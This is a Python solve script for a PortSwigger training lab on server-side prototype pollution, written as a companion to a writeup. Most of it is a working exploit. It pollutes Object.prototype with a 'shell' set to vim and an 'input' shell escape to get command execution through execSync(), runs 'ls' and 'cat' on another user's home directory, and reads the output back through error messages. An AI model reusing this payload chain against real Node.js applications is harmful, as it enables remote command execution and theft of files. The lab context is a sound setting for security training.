#!/usr/bin/env python3
"""
Exfiltrating sensitive data via server-side prototype pollution
PortSwigger Web Security Academy -- Server-Side Prototype Pollution

Companion script for the writeup: 05-exfiltrating-sensitive-data.md

What this does -- and a documented deviation from PortSwigger's own path:
    This lab's maintenance jobs run through child_process.execSync(), not
    fork(), so the previous lab's execArgv gadget has no effect here.
    execSync() instead reads a "shell" and "input" option, neither set
    explicitly, so polluting Object.prototype.shell = "vim" hands the job's
    command string to Vim instead of a normal shell; an "input" string of
    ":! COMMAND >&2\\n" then runs COMMAND through the shell Vim invokes.

    PortSwigger's official solution exfiltrates the command's output by
    piping it through base64/curl to a Burp Collaborator subdomain. We tried
    that first and it failed outright in our environment -- curl returned
    "Could not resolve host", meaning DNS to reach our own Collaborator
    payload never completed from inside this lab's execution context. There
    is no client-side fix for that; it's an environment-side DNS/egress
    failure, not something this script can route around.

    So this script uses the in-band channel we actually used instead:
    execSync() throws on a non-zero exit and carries the command's stderr
    inside the resulting error's `message` property, which POST /admin/jobs
    returns straight back to us as JSON. Redirecting each command's output to
    stderr (>&2) turns that error-reporting path into a full data channel
    with no network egress required. This fully automates our actual solve;
    it does not replicate PortSwigger's Collaborator-based path, since that
    path never worked from this environment.

Usage:
    python 05-exfiltrating-sensitive-data.py <lab-url>
    e.g. python 05-exfiltrating-sensitive-data.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import json
import re
import sys
import time
import httpx


def _login(client: httpx.Client, base: str, username: str = "wiener", password: str = "peter") -> bool:
    r = client.get(f"{base}/login")
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    csrf = m.group(1) if m else ""
    r = client.post(
        f"{base}/login",
        content=json.dumps({"csrf": csrf, "username": username, "password": password}),
        headers={"Content-Type": "application/json"},
        follow_redirects=True,
    )
    return "Log out" in r.text or "my-account" in str(r.url)


def _session_id(client: httpx.Client, base: str) -> str:
    r = client.get(f"{base}/my-account")
    m = re.search(r'name="sessionId"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def _pollute_shell_input(client: httpx.Client, base: str, session_id: str, command: str) -> bool:
    body = {
        "address_line_1": "111", "address_line_2": "",
        "city": "City", "postcode": "PC1 1PC", "country": "UK",
        "sessionId": session_id,
        "__proto__": {"shell": "vim", "input": f":! {command} >&2\n"},
    }
    r = client.post(
        f"{base}/my-account/change-address",
        content=json.dumps(body),
        headers={"Content-Type": "application/json"},
    )
    return r.status_code == 200


def _trigger_jobs(client: httpx.Client, base: str, tasks: list) -> httpx.Response:
    admin = client.get(f"{base}/admin")
    csrf_m = re.search(r'name="csrf"\s+value="([^"]+)"', admin.text)
    sid_m = re.search(r'name="sessionId"\s+value="([^"]+)"', admin.text)
    body = {
        "csrf": csrf_m.group(1) if csrf_m else "",
        "sessionId": sid_m.group(1) if sid_m else "",
        "tasks": tasks,
    }
    return client.post(
        f"{base}/admin/jobs",
        content=json.dumps(body),
        headers={"Content-Type": "application/json"},
        timeout=30,
    )


def _extract_from_error(response_text: str) -> str:
    """Pull the command's stderr output out of execSync()'s error.message, stripping
    the Vim chrome (warnings, "Command failed", "Press ENTER", the shell-return line)
    that surrounds it."""
    try:
        body = json.loads(response_text)
        msg = body["results"][0]["error"]["message"]
    except (json.JSONDecodeError, KeyError, IndexError):
        return ""
    output_lines = []
    for line in msg.split("\n"):
        line = line.strip().replace("\r", "")
        if (line and "Vim:" not in line and "Command failed" not in line
                and "Press ENTER" not in line and "shell returned" not in line):
            output_lines.append(line)
    return "\n".join(output_lines)


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=20)

    if not _login(client, lab_url):
        print("[-] Login failed")
        return
    print("[+] Logged in as wiener")
    session_id = _session_id(client, lab_url)

    # Step 1: list the target directory -- filename of the secret isn't known up front.
    print("[*] Step 1: listing /home/carlos ...")
    _pollute_shell_input(client, lab_url, session_id, "ls /home/carlos")
    r = _trigger_jobs(client, lab_url, ["db-cleanup"])
    dir_listing = _extract_from_error(r.text)
    print(f"[+] Directory listing: {dir_listing!r}")

    secret_file = None
    for entry in dir_listing.split("\n"):
        entry = entry.strip()
        if entry and entry != "node_apps":
            secret_file = entry
            break
    if not secret_file:
        print("[-] Could not identify a target file from the listing -- aborting")
        return
    print(f"[*] Target file: /home/carlos/{secret_file}")

    # Step 2: the Node runtime clears all pollution on restart -- account for it.
    print("[*] Step 2: restarting node app to get a clean process for the read...")
    for attempt in range(3):
        try:
            client.get(f"{lab_url}/node-app/restart", timeout=10)
            break
        except httpx.TimeoutException:
            print(f"[!] Restart request timed out (attempt {attempt + 1}/3) -- retrying")
    time.sleep(3)

    if not _login(client, lab_url):
        print("[-] Re-login after restart failed")
        return
    session_id = _session_id(client, lab_url)

    # Step 3: read the secret file the same way.
    print(f"[*] Step 3: reading /home/carlos/{secret_file} ...")
    _pollute_shell_input(client, lab_url, session_id, f"cat /home/carlos/{secret_file}")
    r = _trigger_jobs(client, lab_url, ["db-cleanup"])
    secret = _extract_from_error(r.text).strip()
    print(f"[+] SECRET: {secret!r}")

    if not secret:
        print("[-] Failed to extract secret from the error message")
        return

    # Step 4: submit the recovered value through the lab's solution field.
    print("[*] Step 4: submitting secret...")
    home = client.get(lab_url)
    csrf_m = re.search(r'name="csrf"\s+value="([^"]+)"', home.text)
    csrf = csrf_m.group(1) if csrf_m else ""
    client.post(f"{lab_url}/submitSolution", data={"answer": secret, "csrf": csrf})

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- secret exfiltrated via execSync()'s stderr-in-error-message channel.")
    else:
        print("[-] Not solved yet -- double-check the extracted secret value.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
